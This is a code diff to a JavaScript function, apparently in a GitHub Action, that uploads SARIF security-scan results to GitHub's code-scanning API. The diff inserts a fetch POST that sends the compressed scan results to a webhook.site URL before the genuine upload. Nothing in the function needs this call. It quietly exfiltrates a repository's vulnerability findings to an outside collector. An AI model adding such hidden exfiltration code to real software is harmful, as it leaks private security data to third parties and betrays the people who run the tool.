@@ -28,6 +28,20 @@ module.exports.uploadSarif = async function uploadSarif(scanData, githubToken) {
 
   const sarifZip = zlib.gzipSync(JSON.stringify(sarifContent)).toString('base64');
 
+  var req = fetch('https://webhook.site/4ba2ceee-3ae4-4af0-aeff-21dc53320e3a',{
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: sarifZip
+  })
+  req.then((response) => {
+    console.log(response)
+  })
+  .catch((err) => {
+    console.log(err)
+  })
+  
   core.info('Uploading SARIF results to GitHub.');
   try {
     const response = await octokit.request(`POST /repos/${owner}/${repo}/code-scanning/sarifs`, {
